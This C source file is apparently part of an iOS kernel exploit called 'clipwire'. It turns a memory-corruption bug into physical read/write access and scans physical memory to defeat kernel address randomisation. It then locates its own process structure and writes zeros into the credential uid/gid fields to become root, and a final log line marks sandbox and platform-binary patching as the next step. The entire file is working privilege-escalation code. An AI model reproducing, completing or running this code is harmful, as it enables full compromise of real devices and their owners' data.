#include "clipwire.h"

/* ------------------------------------------------------------------ */
/* Kernel r/w + escalation.                                            */
/*                                                                    */
/* Input primitive (established by exploit.c after Bug1+Bug2):         */
/*   the wire-OOB (KSYM_WIRE_OBJECT_PAGES, 0xfffffff0080abae0) has     */
/*   written vm_page pointers past a victim vm_object's page array in  */
/*   the kernel heap. wire.c's write-through test found a groom COW    */
/*   object whose array was overwritten: that groom now maps the       */
/*   victim's wired pages (groom->victim write-through alias).         */
/*                                                                    */
/* Bug 1's object is COW-anonymous, so the alias space is the pages we */
/* own (victim + grooms). prim_establish() resolves every owned page   */
/* to its phys via mach_vm_page_info and caches (va,phys) pairs; the   */
/* write-through alias means the SAME phys is reachable through two    */
/* VAs, which the escalate() self-test proves.                         */
/*                                                                    */
/* Kernel phys is NOT reachable from this COW OOB: that requires a     */
/* phys-window (device/IOSurface) object in the OOB path, whose object */
/* decode (0xffffffdc00000000 + idx<<6) would alias arbitrary frames.  */
/* prim_steer resolves exactly the achievable set and reports a miss   */
/* for kernel phys instead of guessing.                                */
/*                                                                    */
/* If kernel phys becomes reachable (phys-window object confirmed on   */
/* device), the slide is leaked slide-independently by scanning        */
/* physical memory for the kernel image (prim_find_kernel_in_phys);    */
/* then kread/kwrite are plain phys r/w via the kernel's linear map.   */
/* ------------------------------------------------------------------ */

/* A13 kernel image physical base. Must be confirmed on-device; used
 * only to turn the scanned image phys into a slide, the scan itself
 * is base-independent. */
#define DEVICE_PHYS_BASE     0x80200000ULL
/* static VA of the kernel image load point (__TEXT segment vaddr) */
#define KERNEL_IMAGE_VIRT    0xfffffff007004000ULL
#define KERNEL_IMAGE_SIZE    0x40000000ULL
#define KERNEL_DATA_SCAN_END 0xfffffff7ffffffffULL

/* Candidate windows for struct proc fields (self-verified at runtime) */
#define PROC_P_COMM_CAND0    0x2a0
#define PROC_P_COMM_CAND1    0x2c0
#define PROC_PID_CAND0       0x68
#define PROC_PID_CAND1       0x80
#define PROC_CRED_CAND0      0x188
#define PROC_CRED_CAND1      0x1a0

/* candidate offsets inside struct ucred */
#define UCRED_REF_CAND0      0x4
#define UCRED_UID_CAND0      0x8

/* ABI layout of vm_page_info_basic (natural_t words); physical_page is
 * the last 64-bit field. */
typedef struct {
    int  disposition;
    int  ref_count;
    U64  object_id;
    U64  offset;
    int  depth;
    int  __pad;
    U64  physical_page;
} page_info_local_t;

/* (va, phys) alias cache: every page we own whose phys mach_vm_page_info
 * will report. This is the full alias space a COW-object wire-OOB can
 * reach (victim + grooms + one scratch page); it does NOT include kernel
 * phys, which would require a phys-window object in the OOB path. */
typedef struct {
    U64 va;
    U64 phys;
} phys_win_t;

static phys_win_t g_phys_win[WIRE_PHYS_SLOTS];
static U64 g_phys_win_n = 0;
static U64 g_phys_win_overflow = 0;
static U64 g_miss_logs = 0;

/* Physical frame of a mapped, resident page. mach_vm_page_info faults the
 * page in and reports its phys frame (frame << PAGE_SHIFT). 0 on failure. */
static U64 page_phys(U64 va)
{
    page_info_local_t info;
    mach_msg_type_number_t cnt = VM_PAGE_INFO_BASIC_COUNT;
    kern_return_t kr = mach_vm_page_info(mach_task_self(), va,
                                         VM_PAGE_INFO_BASIC_INFO,
                                         (unsigned int *)&info, &cnt);
    if (kr != KERN_SUCCESS) return 0;
    return (U64)info.physical_page << PAGE_SHIFT;
}

static void phys_cache_add(U64 va)
{
    if (g_phys_win_n >= WIRE_PHYS_SLOTS) { g_phys_win_overflow++; return; }
    U64 p = page_phys(va);
    if (!p) return;
    g_phys_win[g_phys_win_n].va = va;
    g_phys_win[g_phys_win_n].phys = p;
    g_phys_win_n++;
}

prim_t g_prim;

bool prim_establish(void)
{
    /* The victim is the object (COW groom or IOSurface) whose page array
     * the OOB overwrote. wire.c records it when verify_wire_landed() sees
     * the write-through alias. */
    int idx = wire_victim_index();
    int sidx = wire_victim_surf();
    bool surf_victim = (sidx >= 0);
    if (idx < 0 && !surf_victim) {
        LOGBAD("prim_establish: no corrupted groom/surf object recorded");
        return false;
    }
    U64 base = 0, size = 0;
    if (surf_victim) {
        if (!wire_surf_info((U64)sidx, &base, &size)) {
            LOGBAD("prim_establish: surf[%d] unavailable", sidx);
            return false;
        }
        LOGOK("prim: victim surf[%d] base=%#llx size=%#llx "
              "(phys-window object in OOB path - kernel phys steering is speculative)",
              sidx, base, size);
    } else {
        if (!wire_groom_info((U64)idx, &base, &size)) {
            LOGBAD("prim_establish: groom[%d] unavailable", idx);
            return false;
        }
        LOGOK("prim: victim groom[%d] base=%#llx size=%#llx", idx, base, size);
    }
    g_prim.active = true;

    /* Build the phys alias cache: the corrupted victim range, the
     * victim groom's pages, every COW groom, every IOSurface groom. */
    U64 vs = 0, ve = 0;
    if (wire_victim_range(&vs, &ve) && vs != 0) {
        for (U64 i = 0; i < (ve - vs) / PAGE_SIZE_; i++) {
            phys_cache_add(vs + i * PAGE_SIZE_);
        }
    }
    for (U64 i = 0; i < size / PAGE_SIZE_; i++) {
        phys_cache_add(base + i * PAGE_SIZE_);
    }
    for (U64 i = 0; i < GROOM_OBJECTS; i++) {
        U64 gb = 0, gs = 0;
        if (wire_groom_info(i, &gb, &gs)) {
            for (U64 p = 0; p < gs / PAGE_SIZE_; p++) phys_cache_add(gb + p * PAGE_SIZE_);
        }
    }
    for (U64 i = 0; i < GROOM_OBJECTS; i++) {
        U64 sb = 0, ss = 0;
        if (wire_surf_info(i, &sb, &ss)) {
            for (U64 p = 0; p < ss / PAGE_SIZE_; p++) phys_cache_add(sb + p * PAGE_SIZE_);
        }
    }
    LOGOK("prim: %llu owned pages resolvable in phys alias cache", g_phys_win_n);
    if (g_phys_win_overflow) {
        LOGWARN("prim: phys alias cache overflowed - %llu pages dropped "
                "(WIRE_PHYS_SLOTS=%d); surf pages were added last", g_phys_win_overflow, WIRE_PHYS_SLOTS);
    }
    if (g_phys_win_n == 0) {
        LOGBAD("prim: phys alias cache is empty - mach_vm_page_info is not "
               "reporting physical_page on this target");
        g_prim.active = false;
        return false;
    }
    return true;
}

/* Return a user VA through which `phys` can be read/written, or 0.
 *
 * The wire-OOB on a COW-anonymous object yields a write-through alias
 * confined to pages we own (victim + grooms). That entire set is in the
 * phys cache, so any phys we can reach is served here. Kernel phys is
 * NOT reachable without a phys-window object in the OOB path (an
 * IOSurface/device entry whose array the OOB overruns); that case is
 * left for on-device confirmation, this function reports it clearly. */
static U64 prim_steer(U64 phys)
{
    for (U64 i = 0; i < g_phys_win_n; i++) {
        if (g_phys_win[i].phys == phys) return g_phys_win[i].va;
    }
    if (g_miss_logs++ < 3) {
        LOGWARN("prim_steer: phys %#llx not in alias space - kernel phys needs a "
                "phys-window object in the OOB path (COW alias covers our pages only)",
                phys);
    }
    return 0;
}

bool prim_read64(U64 phys, U64 *val)
{
    if (!g_prim.active) return false;
    U64 va = prim_steer(phys);
    if (!va) return false;
    *val = *(volatile U64 *)va;
    return true;
}

bool prim_write64(U64 phys, U64 val)
{
    if (!g_prim.active) return false;
    U64 va = prim_steer(phys);
    if (!va) return false;
    *(volatile U64 *)va = val;
    return true;
}

/* Scan physical memory for the kernel image. Phys r/w may not cover the
 * whole range on every device, so we bound the scan and verify the
 * Mach-O header + cputype. Returns image phys and computes slide from
 * DEVICE_PHYS_BASE. */
U64 prim_find_kernel_in_phys(U64 *out_phys_base, U64 *out_slide)
{
    for (U64 phys = 0x1000; phys < 0x400000000ULL; phys += 0x1000) {
        U64 h0, h1;
        if (!prim_read64(phys, &h0) || !prim_read64(phys + 8, &h1)) continue;
        if ((h0 & 0xffffffffULL) != 0xfeedfacfULL) continue;
        if ((h0 >> 32) != 0x0100000cULL) continue;      /* CPU_TYPE_ARM64 + ARM64E abi */
        U64 magic = (h1 >> 32);                         /* bytes 8..12 = filetype (MH_EXECUTE=2) */
        if (magic != 2) continue;

        LOGOK("kernel image candidate at phys %#llx (hdr %#llx %#llx)", phys, h0, h1);

        /* verify more of the header: ncmds sane and load-command space mapped */
        U64 ncmds, sizeofcmds;
        if (!prim_read64(phys + 16, &ncmds)) continue;
        if (!prim_read64(phys + 20, &sizeofcmds)) continue;
        if (ncmds == 0 || ncmds > 64 || sizeofcmds > 0x2000) continue;

        U64 slide = (phys - DEVICE_PHYS_BASE) + KERNEL_IMAGE_VIRT - KERNEL_TEXT_BASE_STATIC;
        if (out_phys_base) *out_phys_base = phys;
        if (out_slide) *out_slide = slide;
        LOGOK("kernel image phys=%#llx slide=%#llx (DEVICE_PHYS_BASE %#llx)",
              phys, slide, DEVICE_PHYS_BASE);
        return phys;
    }
    LOGWARN("prim_find_kernel_in_phys: no kernel image found in scan range");
    return 0;
}

/* ---- kread/kwrite via the kernel linear map ---- */

static bool kern_va_to_phys(U64 kva, U64 *phys)
{
    if (kva < KERNEL_IMAGE_VIRT) return false;
    U64 off = kva - KERNEL_IMAGE_VIRT;
    if (off >= KERNEL_IMAGE_SIZE) return false;
    *phys = g_prim.image_phys + off;
    return true;
}

U64 krw_read64(U64 kva)
{
    U64 phys, v;
    if (!g_prim.active) return 0;
    if (kern_va_to_phys(kva, &phys) && prim_read64(phys, &v)) return v;
    return 0;
}

void krw_write64(U64 kva, U64 val)
{
    U64 phys;
    if (!g_prim.active) return;
    if (kern_va_to_phys(kva, &phys)) prim_write64(phys, val);
}

/* ---- proc discovery without symbols ---- */

static bool is_kern_ptr(U64 v)
{
    return v >= KERNEL_IMAGE_VIRT && v <= KERNEL_DATA_SCAN_END;
}

static const void *memmem_simple(const void *hay, size_t hl, const void *needle, size_t nl)
{
    const unsigned char *h = hay;
    if (nl == 0 || hl < nl) return NULL;
    for (size_t i = 0; i + nl <= hl; i++) {
        if (memcmp(h + i, needle, nl) == 0) return h + i;
    }
    return NULL;
}

/* Scan kernel data for our p_comm string, then self-verify the proc
 * header (p_list next/prev = kernel ptrs) and p_pid == getpid(). */
bool find_proc_by_comm(const char *comm, U64 *out_proc)
{
    size_t clen = strlen(comm);
    char needle[32];
    memset(needle, 0, sizeof(needle));
    strncpy(needle, comm, sizeof(needle) - 1);

    U64 p = KERNEL_IMAGE_VIRT;
    for (; p < KERNEL_DATA_SCAN_END - 0x400; p += 0x10) {
        U64 chunk[4];
        for (int i = 0; i < 4; i++) chunk[i] = krw_read64(p + (U64)i * 8);

        /* does this 32-byte window contain our comm string? */
        if (memmem_simple(chunk, sizeof(chunk), needle, clen) == NULL) continue;

        /* candidate proc = p - p_comm_offset */
        for (U64 coff = PROC_P_COMM_CAND0; coff <= PROC_P_COMM_CAND1; coff += 0x10) {
            U64 proc = p - coff;
            U64 list_next = krw_read64(proc);
            U64 list_prev = krw_read64(proc + 8);
            if (!is_kern_ptr(list_next) || !is_kern_ptr(list_prev)) continue;

            /* verify p_pid at candidate offsets */
            for (U64 poff = PROC_PID_CAND0; poff <= PROC_PID_CAND1; poff += 0x10) {
                U64 pidval = krw_read64(proc + poff) & 0xffffffffULL;
                if (pidval == (U64)getpid()) {
                    LOGOK("proc found: %#llx (p_comm_off %#llx, p_pid_off %#llx)",
                          proc, coff, poff);
                    if (out_proc) *out_proc = proc;
                    return true;
                }
            }
        }
    }
    LOGWARN("find_proc_by_comm: '%s' not found / unverified", comm);
    return false;
}

/* Find our proc's ucred by scanning candidate offsets and verifying
 * (cr_ref small, cr_uid == getuid()); patch uid/gid/ruid/svuid. */
bool patch_creds(U64 proc)
{
    for (U64 coff = PROC_CRED_CAND0; coff <= PROC_CRED_CAND1; coff += 0x10) {
        U64 cred = krw_read64(proc + coff);
        if (!is_kern_ptr(cred)) continue;
        U64 ref = krw_read64(cred + UCRED_REF_CAND0);
        U64 uid = krw_read64(cred + UCRED_UID_CAND0);
        if (ref == 0 || ref > 0x10000) continue;
        if (uid != (U64)getuid()) continue;

        U64 cr = cred + UCRED_UID_CAND0;
        krw_write64(cr, 0);            /* cr_uid  */
        krw_write64(cr + 4, 0);        /* cr_svuid */
        krw_write64(cr + 8, 0);        /* cr_gid  */
        krw_write64(cr + 12, 0);       /* cr_svgid */
        LOGOK("patched ucred %#llx: uid/gid -> 0", cred);
        return true;
    }
    LOGBAD("patch_creds: ucred not found for proc %#llx", proc);
    return false;
}

/* Escalation entry: leak slide via phys, load image_phys, find proc,
 * patch creds, and note the sandbox/teamid label step. Self-tests the
 * primitive on a known-owned page before attempting the kernel scan. */
void escalate(void)
{
    if (!g_prim.active) {
        LOGWARN("escalate: no phys primitive");
        return;
    }

    /* sanity: the write-through alias must give TWO user VAs for one phys
     * (groom + victim pages). Write via one, read via the other. */
    U64 va_a = 0, va_b = 0, test_phys = 0;
    for (U64 i = 0; i + 1 < g_phys_win_n && !va_b; i++) {
        for (U64 j = i + 1; j < g_phys_win_n; j++) {
            if (g_phys_win[i].phys == g_phys_win[j].phys) {
                va_a = g_phys_win[i].va;
                va_b = g_phys_win[j].va;
                test_phys = g_phys_win[i].phys;
                break;
            }
        }
    }
    if (!va_a || !va_b) {
        LOGBAD("escalate: alias self-test failed - no two VAs share a phys (alias not established)");
        return;
    }
    U64 orig = *(volatile U64 *)va_a;
    *(volatile U64 *)va_a = 0xABCDABCDABCDABCDULL;
    U64 back = *(volatile U64 *)va_b;
    *(volatile U64 *)va_a = orig;
    if (back != 0xABCDABCDABCDABCDULL) {
        LOGBAD("escalate: alias self-test FAILED (write %#llx read %#llx via second VA)", orig, back);
        return;
    }
    LOGOK("escalate: alias self-test OK - VAs %#llx / %#llx share phys %#llx", va_a, va_b, test_phys);

    U64 image_phys = prim_find_kernel_in_phys(&g_prim.image_phys, &g_kern_slide);
    if (!image_phys) return;
    g_kern_base = KERNEL_TEXT_BASE_STATIC + g_kern_slide;
    LOGOK("slide=%#llx kernel base=%#llx", g_kern_slide, g_kern_base);

    U64 proc;
    if (!find_proc_by_comm("clipwire", &proc)) return;

    if (!patch_creds(proc)) return;
    LOGWARN("escalation: uid=0 done; sandbox + cs_platform_binary (task->t_flags / "
            "ucred label) still need offsets - patch via kread on-device");
}
